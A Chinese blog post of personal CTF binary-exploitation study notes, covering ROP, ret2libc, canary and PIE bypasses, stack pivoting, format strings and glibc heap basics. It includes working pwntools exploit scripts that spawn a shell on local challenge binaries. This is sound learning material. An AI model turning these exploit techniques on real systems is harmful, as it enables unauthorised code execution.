    <content><![CDATA[<p>怕win11又有bug，所以还是先上传一份笔记，一也是方便查看，二防止到时候又丢了</p>
<p>因为自己本地一直在更新有什么格式的问题先不纠正了</p>
<span id="more"></span>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x101-学习路线"><a href="#0x101-学习路线" class="headerlink" title="0x101 学习路线"></a>0x101 学习路线</h2><h3 id="0x01-汇编语法"><a href="#0x01-汇编语法" class="headerlink" title="0x01 汇编语法"></a>0x01 汇编语法</h3><h4 id="Intel语法和AT-amp-T语法的区别（典型）"><a href="#Intel语法和AT-amp-T语法的区别（典型）" class="headerlink" title="Intel语法和AT&amp;T语法的区别（典型）"></a>Intel语法和AT&amp;T语法的区别（典型）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax 1 ;INTEL</span><br><span class="line">movl $1, %eax //AT&amp;T</span><br></pre></td></tr></table></figure>

<h3 id="0x02-数据类型"><a href="#0x02-数据类型" class="headerlink" title="0x02 数据类型"></a>0x02 数据类型</h3><p>按字节分的话</p>
<ul>
<li>单字节：字节（Bytes），符</li>
<li>双字节：词（Word），字</li>
<li>四字节：双词（DWord，doubleword）</li>
<li>八字节：四词（QWorld，quadword）</li>
<li>16字节：双四词，八词（double quadword）</li>
</ul>
<p>对应C语言的数据类型</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210193836184.png" alt="image-20211210193836184"></p>
<h3 id="0x03-Python"><a href="#0x03-Python" class="headerlink" title="0x03 Python"></a>0x03 Python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sn = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s : p.recv(s)</span><br><span class="line">sla = <span class="keyword">lambda</span> r, s : p.sendlineafter(r, s)</span><br><span class="line">sa = <span class="keyword">lambda</span> r, s : p.sendafter(r, s)</span><br></pre></td></tr></table></figure>

<h2 id="0x102-栈溢出"><a href="#0x102-栈溢出" class="headerlink" title="0x102 栈溢出"></a>0x102 栈溢出</h2><p>会用cyclic计算溢出到返回地址的长度</p>
<h3 id="0x01-ret2shellcode"><a href="#0x01-ret2shellcode" class="headerlink" title="0x01 ret2shellcode"></a>0x01 ret2shellcode</h3><p>特征：栈可执行保护（NX）关闭（内存中有一段rwx的</p>
<h3 id="0x02-ROP"><a href="#0x02-ROP" class="headerlink" title="0x02 ROP"></a>0x02 ROP</h3><p>特征：1. 程序存在栈溢出，NX保护开启，其他保护关闭；2. 找得到满足的gadgets</p>
<p>Return Oriented Programming（返回导向编程），利用程序已有的代码片段（gadgets）来改变某些寄存器或者变量的值，绕过NX保护</p>
<ul>
<li>gadgets：以<code>ret</code>结尾的指令序列</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary [file_name] --only <span class="string">&quot;pop|ret&quot;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ropper -f [file_name] --search <span class="string">&quot;pop|ret&quot;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="0x1-ret2text"><a href="#0x1-ret2text" class="headerlink" title="0x1 ret2text"></a>0x1 ret2text</h4><p>特征：程序本身有提供了shellcode等功能</p>
<p>只需要栈溢出将返回地址覆盖为这段代码的起始地址</p>
<h4 id="0x2-ret2syscall"><a href="#0x2-ret2syscall" class="headerlink" title="0x2 ret2syscall"></a>0x2 ret2syscall</h4><p>特征：程序没有现成的shellcode，找代码片段（gadget）</p>
<p>通过执行gadgets改变寄存器的值然后控制程序执行系统调用</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211122144640565.png" alt="image-20211122144640565"></p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_eax_ret =</span><br><span class="line">pop_ebx_ret =</span><br><span class="line">pop_ecx_ret =</span><br><span class="line">pop_edx_ret =</span><br><span class="line">pop_edx_ecx_ebx_ret =</span><br><span class="line">int_0x80 =</span><br><span class="line">bin_sh_addr =</span><br><span class="line">payload = [padding] + p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">		  + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">    	  + p32(int_0x80)</span><br></pre></td></tr></table></figure>

<h4 id="0x3-ret2libc"><a href="#0x3-ret2libc" class="headerlink" title="0x3 ret2libc"></a>0x3 ret2libc</h4><p>基本方法：找到<code>system</code>函数地址，找到<code>/bin/sh</code>字符串地址</p>
<p>最为常用，执行libc中的函数，通常是返回到某个函数的plt处或者是函数的实际地址</p>
<p>注意：</p>
<ol>
<li><p>32位程序的栈中，一个函数地址的后面紧跟的是执行程序之后的返回地址，然后才是函数的参数</p>
</li>
<li><p>64位程序，函数也存放在寄存器RDI,RSI,RDX,RCX,R8,R9等当中，第7个参数才会放在栈中</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211122153638634.png" alt="image-20211122153638634"></p>
</li>
</ol>
<p>EXP：</p>
<ul>
<li>有<code>system</code>和<code>/bin/sh</code>（分开的，用gdb plt找</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = [padding] + p32([system_addr]) + <span class="string">b&quot;xxxx&quot;</span> + p32([bin_sh_addr])</span><br></pre></td></tr></table></figure>

<ul>
<li>没有<code>system</code>和<code>/bin/sh</code>，泄漏<code>system</code>地址</li>
</ul>
<p>（通过被使用函数got表中存放的真实地址与libc基址相减，偏移再和<code>system</code>内存地址相加，从而泄漏<code>system</code>真实地址</p>
<hr>
<p>之前的ret2text，ret2syscall属于有手就行，也没找到就近的例子，有关于ret2libc的题目，记录一下流程</p>
<p>先运行试试，让我们输入一个十进制地址，会告诉我们地址中的内容，然后又让我们输入一些东西并返回输入</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124115836772.png" alt="image-20211124115836772"></p>
<p>例行查看保护，只有NX打开，说明是ROP类型的题目</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124114943675.png" alt="image-20211124114943675"></p>
<p>在IDA中反编译分析流程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v4; <span class="comment">// [esp+4h] [ebp-11Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+8h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+12h] [ebp-10Eh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>]; <span class="comment">// [esp+112h] [ebp-Eh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">10u</span>);</span><br><span class="line">  v8 = strtol(buf, v4, v5);                     <span class="comment">// string_2_long</span></span><br><span class="line">  See_something(v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">256u</span>);</span><br><span class="line">  Print_message(src);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main函数里不存在栈溢出（不算被调函数内部</p>
<p>See_something函数返回输入参数地址，和运行尝试一样，可以在不破坏程序的情况下得到一些我们想要的东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">See_something</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>, *a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Print_message函数中有<code>strcpy</code>，而且可以栈溢出，计算需要填充的垃圾数据是60</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">Print_message</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">56</span>]; <span class="comment">// [esp+10h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your message is : %s&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于没有使用过<code>system</code>和<code>/bin/sh</code>，所以需要泄漏libc中<code>system</code>和<code>\bin\sh</code>的地址</p>
<p>进入gdb调试，main函数处下断点，参看plt表有哪些函数，就通过<code>puts</code>来泄漏<code>libc</code>基址吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124153136270.png" alt="image-20211124153136270"></p>
<p>单步直到程序执行过一次<code>puts</code>，查看got表，存放<code>puts</code>函数的got表地址为<code>0x804a01c</code>，而<code>puts</code>在libc中的真实地址为<code>0xf7e42ca0</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124200222364.png" alt="image-20211124200222364"></p>
<p>查看程序各段的地址和范围，找到<code>libc</code>基址<code>0xf7ddb000</code></p>
<p>将<code>puts</code>在libc中的真实地址与libc基址相减得到偏移<code>0x67ca0</code>，虽然每次运行libc基址都会改变，但是偏移不变，这样我们就可以每次计算<code>libc</code>基址</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124155217765.png" alt="image-20211124155217765"></p>
<p>同理得到<code>system</code>函数离libc基址的偏移<code>0x3d2e0</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124155611802.png" alt="image-20211124155611802"></p>
<p>到此，根据上面的信息就可以得到libc中<code>system</code>的地址，下面要得到libc中<code>/bin/sh</code>的地址，直接在gdb里search，<code>0xf7f590af</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124164149380.png" alt="image-20211124164149380"></p>
<p>同样还是算出相对libc的偏移<code>0x17e0af</code></p>
<p>下面构造payload，由上文注意点中32位的传参机制，我们需要在<code>system_addr</code>和<code>bin_sh_addr</code>中多填充4个字节的垃圾数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = <span class="built_in">int</span>(<span class="string">&quot;0x804a01c&quot;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Give me an address (in dec) :&quot;</span>, <span class="built_in">str</span>(puts_got))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;The content of the address : &quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recvline()[:-<span class="number">1</span>].decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = puts_addr - <span class="number">0x67ca0</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x3d2e0</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x17e0af</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;puts_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;system_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;bin_sh_addr ====&gt; <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">60</span> + p32(system_addr) + <span class="string">b&quot;xxxx&quot;</span> + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="more"><a href="#more" class="headerlink" title="more"></a>more</h5><p>这道题还不够经典，因为它提供了输出程序指定地址的数据，如果将这里也改成可以栈溢出，那么攻击思路就是，第一步通过栈溢出，将返回地址填充为<code>puts_plt</code>，然后调用plt表的函数（runtime_resolve？），后面参数设置为<code>puts_got</code>，如此得到<code>puts</code>在libc中的真实地址，注意32位函数的传参机制，后面的都一样</p>
<p>exp形如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = [padding] + p32(puts_plt) + p32(main_addr) + p32(got_plt)</span><br></pre></td></tr></table></figure>

<p>这里返回到主函数地址应该是让程序正常继续运行的地址</p>
<p>吧？</p>
<hr>
<h4 id="0x4-ret2dl"><a href="#0x4-ret2dl" class="headerlink" title="0x4 ret2dl"></a>0x4 ret2dl</h4><hr>
<p>利用_dl_runtime_resolve函数构造payload，因为该函数是对动态链接的函数进行重定位的</p>
<p>参考<a href=""></a></p>
<hr>
<h3 id="0x03-Canary"><a href="#0x03-Canary" class="headerlink" title="0x03 Canary"></a>0x03 Canary</h3><p>特征：打开canary和NX</p>
<p>绕过方法：</p>
<ol>
<li><p>泄漏栈中的canary，参考<a href="https://4xwi11.github.io/posts/a89e21c0/#pwn-canary">https://4xwi11.github.io/posts/a89e21c0/#pwn-canary</a></p>
<ul>
<li>有合适的输出函数</li>
<li>泄漏canary后程序不会崩溃</li>
</ul>
</li>
<li><p>爆破canary</p>
<ul>
<li>多进程</li>
</ul>
</li>
<li><p>其他方法</p>
<p>联合其他漏洞修改劫持__stack_chk_file函数</p>
<p>覆盖TLS中存储的Canary值</p>
</li>
</ol>
<hr>
<h3 id="0x04-PIE"><a href="#0x04-PIE" class="headerlink" title="0x04  PIE"></a>0x04  PIE</h3><p>特点：开启PIE的程序每次运行时地址的后12位是固定不变的</p>
<p>绕过方法：</p>
<ol>
<li>Partial Write<ul>
<li>程序不大，有后门函数</li>
<li>只需爆破一个字节</li>
</ul>
</li>
<li>直接泄漏地址</li>
</ol>
<hr>
<h4 id="Partial-Write"><a href="#Partial-Write" class="headerlink" title="Partial Write"></a>Partial Write</h4><p>这里借用下N^3新生代赛的例题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100510725.png" alt="image-20211201100510725"></p>
<p>程序存在栈溢出的地方</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100700020.png" alt="image-20211201100700020"></p>
<p>并且有后门函数，其偏移是<code>11C0</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100738927.png" alt="image-20211201100738927"></p>
<p>gdb调试（为啥我的基址不会变？？</p>
<p>首先确定需要填充24字节的垃圾数据才能覆盖到返回地址</p>
<p>接着确定程序的基地址，并计算<code>backdoor</code>函数的真实地址</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102209210.png" alt="image-20211201102209210"></p>
<p>与<code>vul</code>的正常返回地址进行比较（也没看出个啥，还以为是覆盖后3位就好了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102347265.png" alt="image-20211201102347265"></p>
<p>或者上面的这些工作直接溢出，然后查看</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102711462.png" alt="image-20211201102711462"></p>
<p>因为libc地址和基址后3位都是000（Fr. 谢师傅，所以直接覆盖后三位，然后爆破第4位就好了</p>
<h5 id="栈溢出ROP链打不通"><a href="#栈溢出ROP链打不通" class="headerlink" title="栈溢出ROP链打不通"></a>栈溢出ROP链打不通</h5><p>但是因为libc2.27（ubuntu18）在执行<code>system(&quot;/bin/sh&quot;)</code>的时候比较特殊，有栈不对齐的情况，Fr. <a href="https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2">https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2</a>，所以打本地不通，远程由于版本不同就可以</p>
<p>解决的方法是，略过<code>push rbp</code>，直接来到<code>mov rbp, rsp</code></p>
<p>（为啥呢，咱也不敢问</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201103754018.png" alt="image-20211201103754018"></p>
<p>就像有些题payload要多加几个<code>ret</code>一样</p>
<p>参考</p>
<p><a href="https://4xwi11.github.io/posts/a89e21c0/#pwn-pie">https://4xwi11.github.io/posts/a89e21c0/#pwn-pie</a></p>
<h4 id="直接泄漏地址"><a href="#直接泄漏地址" class="headerlink" title="直接泄漏地址"></a>直接泄漏地址</h4><hr>
<h3 id="0x05-其他溢出"><a href="#0x05-其他溢出" class="headerlink" title="0x05 其他溢出"></a>0x05 其他溢出</h3><h4 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h4><ul>
<li>上界溢出</li>
</ul>
<p>注意有符号整数和无符号整数</p>
<ul>
<li>下界溢出</li>
</ul>
<h5 id="未限制范围"><a href="#未限制范围" class="headerlink" title="未限制范围"></a>未限制范围</h5><p>大的数据存入较小的空间，造成和gets一样栈溢出的效果</p>
<p>主要是在堆溢出那一块</p>
<h5 id="错误的类型转换"><a href="#错误的类型转换" class="headerlink" title="错误的类型转换"></a>错误的类型转换</h5><p>范围大的变量转换为范围小的变量，会发生截断</p>
<h3 id="0x06-栈迁移（pivoting）"><a href="#0x06-栈迁移（pivoting）" class="headerlink" title="0x06 栈迁移（pivoting）"></a>0x06 栈迁移（pivoting）</h3><p>劫持栈指针指向攻击者所能控制的内存处，进行ROP等操作，即将ESP或RSP指针修改为可以控制的内存区地址，比如bss段、堆等，然后在可控内存区当中布置payload</p>
<p>条件：1. 程序存在溢出；2. 可以控制sp指针</p>
<p>特征：1. 栈溢出的溢出空间大小不足；2. 存在较大可读可写可执行的区域</p>
<p>注意：远离不可读不可写的内存</p>
<p><strong>可以修改sp指针的指令：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop esp;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop ecx;</span><br><span class="line">lea esp,[ecx-0x4];</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave;</span><br><span class="line">ret;</span><br><span class="line">;i.e.</span><br><span class="line">mov esp, ebp;</span><br><span class="line">pop ebp;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p>总结，也就是说在bss等地方构造ROP链不是通过栈溢出实现的，而跳转到bss段上才是通过栈溢出</p>
<hr>
<p>来看这道题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210111545017.png" alt="image-20211210111545017"></p>
<p><strong>考点：</strong></p>
<p>32位二次栈迁移</p>
<p>核心流程如下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210111427708.png" alt="image-20211210111427708"></p>
<hr>
<p>查完保护发现只开启了NX，应该是ROP</p>
<p>用IDA反编译，发现存在后门函数<code>back</code>，以及read栈溢出，但只能溢出6个字节，范围比较小，此外还可以向全局变量all所在的bss段上写东西</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210194311462.png" alt="image-20211210194311462"></p>
<p>典型的栈迁移</p>
<p>编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pivoting&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x80485F0</span></span><br><span class="line">system_plt = <span class="number">0x8048370</span></span><br><span class="line">all_addr = <span class="number">0x804A060</span></span><br><span class="line"></span><br><span class="line">payload = p32(system_plt) + <span class="string">b&quot;aaaa&quot;</span> + p32(bin_sh_addr)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * <span class="number">10</span> + p32(all_addr + <span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>攻击失败</p>
<p><code>vmmap</code>查看发现<code>0x804A060</code>距离<code>0x804A000</code>的距离较近，而<code>0x804A000</code>是不可写，所以程序到这里崩溃了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210194925878.png" alt="image-20211210194925878"></p>
<p>所以选择二次转移栈将栈迁移到可读可写的内存区</p>
<p>查看可以改变esp指针的gadget</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210200011410.png" alt="image-20211210200011410"></p>
<p>可以用<code>0x804859c9</code>处的指令构造一个<code>read</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop esi;</span><br><span class="line">pop edi;</span><br><span class="line">pop ebp;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p>然后用<code>0x08048564</code>的指令将esp指针也给转移到新的可读可写的内存地址<code>0x804a560</code>，可以上面写100个字节的ROP链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop ecx;</span><br><span class="line">pop ebx;</span><br><span class="line">pop ebp;</span><br><span class="line">lea esp, [ecx-4];</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p>之后再做一次跳转，就完成了我们的栈转移</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pivoting&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x80485F0</span></span><br><span class="line">system_plt = <span class="number">0x8048370</span></span><br><span class="line">read_plt = <span class="number">0x8048340</span></span><br><span class="line">all_addr = <span class="number">0x804A060</span></span><br><span class="line">leave_addr = <span class="number">0x8048425</span></span><br><span class="line">pop_esi_edi_ebp_ret = <span class="number">0x080485c9</span></span><br><span class="line"><span class="comment"># pop ecx; pop ebx; pop ebp; lea esp, [ecx - 4]; ret;</span></span><br><span class="line">pop_ecx_ebx_ebp_lea_esp_ret = <span class="number">0x08048564</span></span><br><span class="line">all_slide_bss = <span class="number">0x804a560</span></span><br><span class="line"></span><br><span class="line">payload1 = p32(read_plt) + p32(pop_esi_edi_ebp_ret) + p32(<span class="number">0</span>) + p32(all_slide_bss) + p32(<span class="number">100</span>)</span><br><span class="line">payload1 += p32(pop_ecx_ebx_ebp_lea_esp_ret) + p32(all_slide_bss + <span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;b&#x27;</span> * <span class="number">10</span> + p32(all_addr + <span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = p32(system_plt) + <span class="string">b&quot;aaaa&quot;</span> + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210112734815.png" alt="image-20211210112734815"></p>
<p>其实中间还有很多细节没有搞懂，再到实战再搞懂吧</p>
<hr>
<p>漏洞实际利用参考</p>
<p><a href="https://4xwi11.github.io/posts/a89e21c0/#pwn-pivoting">N3CTF-pivoting</a></p>
<p><a href="https://4xwi11.github.io/posts/7744a72a/#game">2021湖湘杯的game</a></p>
<h2 id="0x103-格式化字符串"><a href="#0x103-格式化字符串" class="headerlink" title="0x103 格式化字符串"></a>0x103 格式化字符串</h2><p>在输出的时候直接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(value)</span><br></pre></td></tr></table></figure>

<p>格式化字符串漏洞：</p>
<p>由于<code>printf</code>函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作</p>
<p>可以在调试的时候输入，读取距离栈顶第n个栈中的值并以十六进制的形式打印出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%n$x</span><br></pre></td></tr></table></figure>

<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%n</span><br><span class="line">%hn</span><br><span class="line">%hn</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 偏移是7，将0x08048010地址的内容修改为0x10203040</span></span><br><span class="line">payload = fmtstr_pay(<span class="number">7</span>,&#123;<span class="number">0x08048010</span>:<span class="number">0x10203040</span>&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="0x104-堆溢出"><a href="#0x104-堆溢出" class="headerlink" title="0x104 堆溢出"></a>0x104 堆溢出</h2><h3 id="glibc内存管理"><a href="#glibc内存管理" class="headerlink" title="glibc内存管理"></a>glibc内存管理</h3><h4 id="mian-arena-与-no-main-arena"><a href="#mian-arena-与-no-main-arena" class="headerlink" title="mian_arena 与 no_main_arena"></a>mian_arena 与 no_main_arena</h4><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><p>使用中的chunk结构</p>
<p>Size of pre_chunk（$\leftarrow$Chunk指针</p>
<p>Size of chunk，in bytes A/M/P====&gt;是否为我们的主分配区/是否是mmap分配/pre_chunk空闲或使用中（$\leftarrow$Mem指针</p>
<p>User data（$\leftarrow$Next chunk指针</p>
<p>Size of chunk（中间复用）</p>
<p>空闲的chunk结构</p>
<p>Size of pre_chunk（$\leftarrow$Chunk指针</p>
<p>Size of chunk，in bytes A/P（$\leftarrow$Mem指针</p>
<p>*fd====&gt;向后的空闲chunk</p>
<p>*bk====&gt;向前的空闲chunk</p>
<p>*fd_next size（后large bin</p>
<p>*bk_next size（前large bin</p>
<p>user data</p>
<p>Size of chunk，in bytes</p>
<p>chunk的空间复用</p>
<p>32位：0x10</p>
<p>64位：0x20</p>
<h4 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h4><p>free掉的内存不会马上归还给系统</p>
<h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p>tcache -&gt; fastbin -&gt; usorted bin -&gt; bin</p>
<h4 id="三个特殊chunk"><a href="#三个特殊chunk" class="headerlink" title="三个特殊chunk"></a>三个特殊chunk</h4><p>top chunk，mmapedd chunk，last remainder</p>
<h4 id="sbrk和mmap"><a href="#sbrk和mmap" class="headerlink" title="sbrk和mmap"></a>sbrk和mmap</h4><h4 id="内存分配的具体步骤"><a href="#内存分配的具体步骤" class="headerlink" title="内存分配的具体步骤"></a>内存分配的具体步骤</h4><h4 id="内存回收的相关知识"><a href="#内存回收的相关知识" class="headerlink" title="内存回收的相关知识"></a>内存回收的相关知识</h4><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>ubuntu16.04-&gt;glibc2.23</p>
<p>ubuntu18.04-&gt;glibc2.27</p>
